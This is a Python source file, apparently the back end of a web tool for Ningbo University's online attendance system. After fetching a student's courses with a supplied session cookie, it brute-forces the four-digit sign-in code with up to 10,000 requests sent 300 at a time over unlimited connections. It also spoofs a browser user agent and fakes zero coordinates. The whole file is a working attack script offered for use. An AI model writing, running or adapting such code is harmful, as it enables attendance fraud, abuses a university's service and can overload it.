# attendance_logic.py
import requests
import time
import aiohttp
import asyncio
from itertools import islice

STUDENT_NUMBER = "206000695" # 如果需要，可以考虑使其可配置

# --- 获取课程 ---
def get_courses(jsessionid_cookie):
    """使用提供的 JSESSIONID 获取课程列表。"""
    cookies = {"JSESSIONID": jsessionid_cookie}
    timestamp = int(time.time() * 1000)
    url = f"https://attendance.nbu.edu.cn/api/curriculum/student/getCourse?timeNow={timestamp}&pageSize=50&studentNumber={STUDENT_NUMBER}" # 增加了页面大小

    headers = {
        "accept": "application/json, text/plain, */*",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36", # 通用 UA
        "referer": "https://attendance.nbu.edu.cn/h5/student/schedule/"
    }

    try:
        response = requests.get(url, headers=headers, cookies=cookies, timeout=15)
        response.raise_for_status() # 对错误的状态码（4xx 或 5xx）抛出异常
        data = response.json()

        if data.get('code') != 20000:
             # 处理 API 特定的错误（例如，无效的 cookie）
             error_msg = data.get('message', 'API 返回非成功代码。')
             # 检查常见的 cookie 错误消息
             if "请登录" in error_msg or "login" in error_msg.lower():
                 return {"success": False, "error": "无效的 JSESSIONID 或会话已过期。"}
             return {"success": False, "error": f"API 错误: {error_msg} (代码: {data.get('code')})"}

        courses = data.get('data', [])
        if not courses:
            return {"success": True, "courses": [], "message": "今天没有找到课程或 cookie 无效。"}
        else:
            # 为 Web UI 中的选择添加唯一标识符
            for idx, course in enumerate(courses):
                course['ui_id'] = f"course_{idx}"
            return {"success": True, "courses": courses}

    except requests.exceptions.RequestException as e:
        return {"success": False, "error": f"网络请求失败: {str(e)}"}
    except Exception as e:
        return {"success": False, "error": f"发生意外错误: {str(e)}"}


# --- 签到逻辑 (异步) ---
async def _attempt_code_async(session, code, course_plan_id, attendance_id, result_dict):
    """异步助手函数，尝试单个签到码。更新 result_dict。"""
    if result_dict.get("found"): # 如果已被其他任务找到，则停止
        return

    time_now = int(time.time() * 1000)
    url = (
        f"https://attendance.nbu.edu.cn/api/coursePlan/signByCourseCode"
        f"?timeNow={time_now}"
        f"&courseCode={code:04d}"
        f"&coursePlanId={course_plan_id}"
        f"&attendanceId={attendance_id}"
        f"&lng=0&lat=0" # 考虑是否需要真实坐标
    )

    try:
        async with session.get(url, timeout=10) as response:
            # 检查在等待响应时结果是否已被找到
            if result_dict.get("found"):
                return

            # 不要假设响应总是 JSON
            try:
                data = await response.json()
                api_code = data.get('code')
                message = data.get('msg', '无消息')
            except aiohttp.ContentTypeError:
                api_code = -1 # 表示非 JSON 响应
                message = f"非 JSON 响应 (状态码: {response.status})"
            except Exception as json_e:
                api_code = -2 # 表示 JSON 解析错误
                message = f"JSON 解析错误: {json_e}"


            result_dict['total_attempts'] = result_dict.get('total_attempts', 0) + 1

            if api_code == 20000:
                print(f"[✓] 成功! 签到码: {code:04d}") # 在服务器上记录成功日志
                result_dict["found"] = True
                result_dict["success_code"] = f"{code:04d}"
                result_dict["message"] = "签到成功!"
            else:
                # 对非成功代码提供反馈，但不要过多记录日志
                 if result_dict['total_attempts'] % 200 == 0: # 偶尔记录进度
                      print(f"尝试次数 {result_dict['total_attempts']}, 签到码 {code:04d}: 状态 {api_code} - {message}")
                 # 存储最后一个错误消息以供报告
                 result_dict["last_api_code"] = api_code
                 result_dict["last_message"] = message


    except asyncio.TimeoutError:
        result_dict['total_attempts'] = result_dict.get('total_attempts', 0) + 1
        # print(f"[!] 签到码 {code:04d} 超时") # 可选：记录超时
    except aiohttp.ClientError as e:
        result_dict['total_attempts'] = result_dict.get('total_attempts', 0) + 1
        print(f"[!] 签到码 {code:04d} 客户端错误: {e}")
        result_dict["last_error"] = f"网络/客户端错误: {e}" # 存储最后一个主要错误
    except Exception as e:
        result_dict['total_attempts'] = result_dict.get('total_attempts', 0) + 1
        print(f"[!] 处理签到码 {code:04d} 时出错: {e}") # 记录意外错误
        result_dict["last_error"] = f"意外错误: {e}"


async def _brute_force_runner_async(jsessionid_cookie, course_plan_id, attendance_id):
    """运行异步暴力破解尝试。"""
    result_dict = {"found": False, "total_attempts": 0} # 任务共享状态
    batch_size = 300 # 并发请求数
    connector = aiohttp.TCPConnector(limit=0) # 实际上无限制连接
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "referer": "https://attendance.nbu.edu.cn/h5/student/sign/"
    }
    cookies = {"JSESSIONID": jsessionid_cookie}

    async with aiohttp.ClientSession(headers=headers, cookies=cookies, connector=connector) as session:
        code_iter = iter(range(0, 10000))
        while not result_dict.get("found"):
            current_batch_codes = list(islice(code_iter, batch_size))
            if not current_batch_codes:
                print("暴力破解已尝试所有签到码。")
                break # 没有更多代码可尝试

            tasks = [
                _attempt_code_async(session, code, course_plan_id, attendance_id, result_dict)
                for code in current_batch_codes
            ]
            await asyncio.gather(*tasks)
            # 短暂延迟以防止完全压垮服务器并允许上下文切换
            await asyncio.sleep(0.05)


    # 准备最终结果消息
    if result_dict.get("found"):
        return {"success": True, "message": f"签到成功! 找到签到码: {result_dict['success_code']}", "attempts": result_dict['total_attempts']}
    else:
        last_err = result_dict.get("last_error")
        last_msg = result_dict.get("last_message", "未收到具体错误消息。")
        last_api_code = result_dict.get("last_api_code", "N/A")
        error_msg = f"自动签到在 {result_dict['total_attempts']} 次尝试后未成功。"
        if last_err:
             error_msg += f" 最后一个主要错误: {last_err}。"
        else:
             error_msg += f" 最后一个 API 状态: {last_api_code} - {last_msg}。"

        return {"success": False, "error": error_msg, "attempts": result_dict['total_attempts']}

async def _single_sign_runner_async(jsessionid_cookie, course_plan_id, attendance_id, course_code):
    """运行异步单一签到码签到尝试。"""
    result_dict = {"found": False, "total_attempts": 0} # 为保持一致性重用结构
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "referer": "https://attendance.nbu.edu.cn/h5/student/sign/"
    }
    cookies = {"JSESSIONID": jsessionid_cookie}
    connector = aiohttp.TCPConnector(limit=1) # 只需要一个连接

    async with aiohttp.ClientSession(headers=headers, cookies=cookies, connector=connector) as session:
         await _attempt_code_async(session, int(course_code), course_plan_id, attendance_id, result_dict)

    if result_dict.get("found"):
        return {"success": True, "message": f"使用签到码 {course_code} 签到成功!"}
    else:
        last_err = result_dict.get("last_error")
        last_msg = result_dict.get("last_message", "未收到具体错误消息。")
        last_api_code = result_dict.get("last_api_code", "N/A")
        error_msg = f"使用签到码 {course_code} 签到失败。"
        if last_err:
             error_msg += f" 错误: {last_err}。"
        else:
             error_msg += f" API 状态: {last_api_code} - {last_msg}。"
        return {"success": False, "error": error_msg}


# --- 用于同步运行异步代码的包装函数 ---
# 从同步的 Flask 路由调用异步函数时需要这些
def run_brute_force_sign_in(jsessionid_cookie, course_plan_id, attendance_id):
    """异步暴力破解的同步包装器。"""
    try:
        # 使用 asyncio.run() 执行异步函数
        return asyncio.run(_brute_force_runner_async(jsessionid_cookie, course_plan_id, attendance_id))
    except RuntimeError as e:
        # 如果需要，处理 asyncio 事件循环已在运行的情况（在简单的 Flask 应用中不太常见）
        return {"success": False, "error": f"Asyncio 运行时错误: {e}"}
    except Exception as e:
         return {"success": False, "error": f"运行暴力破解时出错: {e}"}


def run_single_sign_in(jsessionid_cookie, course_plan_id, attendance_id, course_code):
    """异步单一签到的同步包装器。"""
    try:
        # 传递前确保代码格式有效
        try:
            code_int = int(course_code)
            if not (0 <= code_int <= 9999):
                raise ValueError("签到码必须在 0000 到 9999 之间。")
            # 格式化为 4 位数字用于 API 调用，尽管函数处理的是 int
            code_str = f"{code_int:04d}"
        except ValueError as ve:
             return {"success": False, "error": f"无效的签到码格式: {ve}"}

        return asyncio.run(_single_sign_runner_async(jsessionid_cookie, course_plan_id, attendance_id, code_int))
    except RuntimeError as e:
        return {"success": False, "error": f"Asyncio 运行时错误: {e}"}
    except Exception as e:
         return {"success": False, "error": f"运行单一签到时出错: {e}"}
